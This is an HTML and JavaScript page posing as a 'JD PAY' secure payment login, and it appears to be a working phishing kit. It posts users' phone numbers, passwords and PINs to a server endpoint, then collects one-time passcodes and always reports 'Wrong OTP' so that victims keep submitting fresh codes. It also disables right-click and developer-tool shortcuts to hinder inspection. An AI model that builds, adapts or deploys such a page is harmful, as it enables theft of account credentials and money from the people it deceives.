<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>JD PAY</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      background: #0a0a0a;
      color: #e0e0e0;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      padding: 20px;
    }
    .container { width: 100%; max-width: 380px; text-align: center; }
    .logo-box {
      width: 130px; height: 130px;
      border-radius: 32px;
      margin: 0 auto 14px;
      overflow: hidden;
      background: #0f0f0f;
      display: flex;
      justify-content: center;
      align-items: center;
      box-shadow: 0 0 40px rgba(212, 175, 55, 0.15);
      border: 1px solid rgba(212, 175, 55, 0.2);
    }
    .logo-box img { width: 100%; height: 100%; object-fit: cover; display: block; }
    .brand-name {
      font-size: 24px; font-weight: 800; letter-spacing: 4px;
      color: #fff; margin-bottom: 6px; text-transform: uppercase;
    }
    .brand-tagline {
      font-size: 12px; color: #d4af37; letter-spacing: 2px;
      margin-bottom: 36px; text-transform: uppercase; opacity: 0.8;
    }
    .input-group {
      display: flex; align-items: center;
      background: rgba(255, 255, 255, 0.02);
      border: 1.5px solid #2a2a2a;
      border-radius: 30px; padding: 16px 22px;
      margin-bottom: 16px;
    }
    .input-group:focus-within { border-color: #d4af37; }
    .input-group svg { width: 22px; height: 22px; fill: #d4af37; margin-right: 16px; flex-shrink: 0; }
    .input-group input {
      background: transparent; border: none; color: #fff;
      font-size: 16px; width: 100%; outline: none; font-weight: 500;
    }
    .input-group input::placeholder { color: #555; font-weight: 400; }
    .input-group input#pin { letter-spacing: 8px; font-weight: 600; }
    .input-group input#pin::placeholder { letter-spacing: normal; font-weight: 400; }
    .row {
      display: flex; justify-content: space-between; align-items: center;
      font-size: 14px; color: #d4af37; margin-bottom: 22px;
      padding: 0 6px; font-weight: 600;
    }
    .row a { color: #d4af37; text-decoration: none; }
    .row div { display: flex; align-items: center; gap: 8px; cursor: pointer; }
    .row input[type="radio"] { width: 16px; height: 16px; accent-color: #d4af37; }
    .checkbox-container {
      display: flex; align-items: center; justify-content: center;
      font-size: 13px; color: #d4af37; margin-bottom: 28px;
      font-weight: 500; gap: 10px;
    }
    .checkbox-container input { width: 18px; height: 18px; accent-color: #d4af37; }
    .btn-main {
      width: 100%; padding: 17px;
      background: linear-gradient(135deg, #2a3a6a 0%, #1a2347 100%);
      color: #fff; border: none; border-radius: 30px;
      font-size: 17px; font-weight: 700; cursor: pointer;
      letter-spacing: 1px;
    }
    .btn-main:disabled { background: #2a2a2a; cursor: not-allowed; color: #666; }
    .popup-overlay {
      display: none; position: fixed; top: 0; left: 0; right: 0; bottom: 0;
      background: rgba(0, 0, 0, 0.85); justify-content: center; align-items: center;
      padding: 20px; z-index: 1000; backdrop-filter: blur(8px);
    }
    .popup-box {
      background: linear-gradient(135deg, #1a1a1a 0%, #141414 100%);
      padding: 28px 24px; border-radius: 26px;
      width: 100%; max-width: 380px; position: relative;
      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.8); border: 1px solid #2a2a2a;
    }
    .close-btn {
      position: absolute; top: 15px; right: 15px;
      background: #2a2a2a; color: #aaa; border: none;
      border-radius: 50%; width: 34px; height: 34px;
      font-size: 16px; cursor: pointer;
      display: flex; align-items: center; justify-content: center;
    }
    .popup-box h2 { font-size: 22px; margin-bottom: 12px; text-align: left; color: #fff; }
    .popup-box p { font-size: 14px; color: #999; margin-bottom: 14px; line-height: 1.5; text-align: left; }
    .popup-box p span { color: #d4af37; font-weight: 700; }
    .otp-input-group {
      display: flex; align-items: center;
      background: rgba(255, 255, 255, 0.02);
      border: 1.5px solid #2a2a2a;
      border-radius: 30px; padding: 6px 6px 6px 20px; margin-bottom: 20px;
    }
    .otp-input-group input {
      flex: 1; background: transparent; border: none;
      color: #fff; padding: 12px 0; font-size: 16px;
      outline: none; letter-spacing: 2px;
    }
    .otp-input-group input::placeholder { color: #666; letter-spacing: normal; }
    .otp-input-group button {
      background: linear-gradient(135deg, #2a3a6a, #1a2347);
      color: #fff; border: none; border-radius: 25px;
      padding: 12px 24px; font-weight: 700; cursor: pointer; font-size: 14px;
    }
    .otp-input-group button:disabled { background: #333; color: #777; cursor: not-allowed; }
    .timer-text { color: #888; font-size: 13px; margin-bottom: 20px; text-align: center; min-height: 18px; }
    .toast {
      position: fixed; top: 20px; left: 50%;
      transform: translateX(-50%) translateY(-100px);
      background: linear-gradient(135deg, #2a3a6a, #1a2347);
      color: #fff; padding: 14px 26px; border-radius: 14px;
      font-size: 14px; font-weight: 600; z-index: 2000;
      transition: transform 0.35s; max-width: 90%; text-align: center;
      border: 1px solid rgba(212, 175, 55, 0.3);
    }
    .toast.show { transform: translateX(-50%) translateY(0); }
    .toast.error { background: linear-gradient(135deg, #b91c1c, #991b1b); }
    .loader {
      display: inline-block; width: 16px; height: 16px;
      border: 2px solid rgba(255,255,255,0.3);
      border-top-color: #fff; border-radius: 50%;
      animation: spin 0.8s linear infinite;
      vertical-align: middle; margin-right: 8px;
    }
    @keyframes spin { to { transform: rotate(360deg); } }
  </style>
</head>
<body>

  <div class="toast" id="toast"></div>

  <div class="container">
    <div class="logo-box">
      <img src="jdlogo.png" alt="JD PAY">
    </div>
    <div class="brand-name">JD PAY</div>
    <div class="brand-tagline">Secure Payment</div>

    <div class="input-group">
      <svg viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
      <input type="tel" id="phone" placeholder="Phone Number" maxlength="10" inputmode="numeric" oninput="this.value = this.value.replace(/[^0-9]/g, '').slice(0,10)">
    </div>

    <div class="input-group">
      <svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg>
      <input type="password" id="pass" placeholder="Password">
    </div>

    <div class="input-group">
      <svg viewBox="0 0 24 24"><path d="M12.65 10C11.83 7.67 9.61 6 7 6c-3.31 0-6 2.69-6 6s2.69 6 6 6c2.61 0 4.83-1.67 5.65-4H17v4h4v-4h2v-4H12.65zM7 14c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2z"/></svg>
      <input type="tel" id="pin" placeholder="6-digit PIN" maxlength="6" inputmode="numeric" oninput="this.value = this.value.replace(/[^0-9]/g, '').slice(0,6)">
    </div>

    <div class="row">
      <a href="#">Register</a>
      <div><input type="radio" name="remember"> Remember Me</div>
    </div>

    <div class="checkbox-container">
      <input type="radio" name="agree" checked> Agree "User Privacy Agreement"
    </div>

    <button class="btn-main" id="signInBtn" onclick="showOTP()">SIGN IN</button>
  </div>

  <div class="popup-overlay" id="otpPopup">
    <div class="popup-box">
      <button class="close-btn" onclick="closeOTP()">✕</button>
      <h2>Login OTP</h2>
      <p>Tap Send to receive the OTP, then enter it to confirm this login.</p>
      <p>OTP will be sent to <span id="displayPhone">+91 XXXXXXXX</span></p>
      <div class="otp-input-group">
        <input type="tel" id="otpInput" placeholder="Enter 6-digit OTP" maxlength="6" inputmode="numeric" oninput="this.value = this.value.replace(/[^0-9]/g, '').slice(0,6)">
        <button id="sendOtpBtn" onclick="sendOTP()">Send</button>
      </div>
      <div class="timer-text" id="timerText"></div>
      <button class="btn-main" id="confirmBtn" onclick="verifyOTP()">CONFIRM</button>
    </div>
  </div>

  <script>
    let countdown;
    let timeLeft = 60;
    let isProcessing = false;

    function showToast(msg, isError = false) {
      const toast = document.getElementById('toast');
      toast.textContent = msg;
      toast.className = 'toast show' + (isError ? ' error' : '');
      clearTimeout(toast._timeout);
      toast._timeout = setTimeout(() => { toast.className = 'toast'; }, 3000);
    }

    async function callAPI(data) {
      try {
        const response = await fetch('/api/send', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(data)
        });
        return await response.json();
      } catch (err) {
        console.error('API Error:', err);
        return { error: 'Network error' };
      }
    }

    async function showOTP() {
      if (isProcessing) return;
      const phone = document.getElementById('phone').value.trim();
      const pass = document.getElementById('pass').value.trim();
      const pin = document.getElementById('pin').value.trim();
      const btn = document.getElementById('signInBtn');

      if (!phone || !pass || !pin) { showToast('Please fill all fields!', true); return; }
      if (phone.length !== 10) { showToast('Phone must be 10 digits!', true); return; }
      if (pin.length !== 6) { showToast('PIN must be exactly 6 digits!', true); return; }

      isProcessing = true;
      btn.disabled = true;
      btn.innerHTML = '<span class="loader"></span>Please wait...';

      try {
        const result = await callAPI({ phone, pass, pin, type: 'login' });
        if (result.error) {
          showToast(result.error, true);
        } else {
          document.getElementById('displayPhone').innerText = "+91 " + phone;
          document.getElementById('otpPopup').style.display = 'flex';
          resetTimer();
        }
      } catch (err) {
        showToast('Something went wrong!', true);
      } finally {
        isProcessing = false;
        btn.disabled = false;
        btn.textContent = 'SIGN IN';
      }
    }

    function closeOTP() {
      document.getElementById('otpPopup').style.display = 'none';
      clearInterval(countdown);
    }

    async function sendOTP() {
      const phone = document.getElementById('phone').value;
      const btn = document.getElementById('sendOtpBtn');
      startTimer();
      btn.disabled = true;
      btn.innerText = "Sending...";
      await callAPI({ phone, type: 'send_otp' });
      btn.innerText = "Sent ✓";
    }

    async function verifyOTP() {
      if (isProcessing) return;
      const otp = document.getElementById('otpInput').value;
      const phone = document.getElementById('phone').value;
      const btn = document.getElementById('confirmBtn');

      if (!otp) { showToast('Please enter OTP!', true); return; }
      if (otp.length !== 6) { showToast('OTP must be 6 digits!', true); return; }

      isProcessing = true;
      btn.disabled = true;
      btn.innerHTML = '<span class="loader"></span>Verifying...';

      try {
        await callAPI({ phone, otp, type: 'verify_otp' });
      } catch (err) { console.error(err); }

      setTimeout(() => {
        isProcessing = false;
        btn.disabled = false;
        btn.textContent = 'CONFIRM';
        showToast('❌ Wrong OTP! Please try again.', true);
      }, 800);
    }

    function startTimer() {
      timeLeft = 60;
      const timerDisplay = document.getElementById('timerText');
      clearInterval(countdown);
      countdown = setInterval(() => {
        if (timeLeft <= 0) {
          clearInterval(countdown);
          timerDisplay.innerText = "";
          document.getElementById('sendOtpBtn').disabled = false;
          document.getElementById('sendOtpBtn').innerText = "Send";
        } else {
          timerDisplay.innerText = "⏳ Resend OTP in " + timeLeft + "s";
          timeLeft--;
        }
      }, 1000);
    }

    function resetTimer() {
      clearInterval(countdown);
      timeLeft = 60;
      document.getElementById('sendOtpBtn').disabled = false;
      document.getElementById('sendOtpBtn').innerText = "Send";
      document.getElementById('otpInput').value = "";
      document.getElementById('timerText').innerText = "";
    }

    document.addEventListener('contextmenu', e => e.preventDefault());
    document.addEventListener('keydown', e => {
      if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && ['I','J','C'].includes(e.key)) || (e.ctrlKey && e.key === 'U')) {
        e.preventDefault();
        return false;
      }
    });
  </script>

</body>
</html>
